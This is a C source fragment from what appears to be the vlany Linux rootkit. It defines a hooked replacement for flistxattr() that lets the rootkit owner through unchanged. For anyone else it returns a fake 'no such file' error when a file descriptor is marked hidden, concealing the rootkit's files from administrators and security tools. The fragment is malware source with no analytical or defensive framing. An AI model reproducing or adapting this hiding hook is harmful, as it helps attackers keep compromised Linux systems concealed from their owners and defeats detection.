ssize_t flistxattr(int fd, char *list, size_t size)
{
    #ifdef DEBUG
        printf("[vlany] flistxattr() called\n");
    #endif

    HOOK(old_flistxattr, CFLISTXATTR);

    if(owned()) return old_flistxattr(fd, list, size);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_flistxattr(fd, list, size);
}
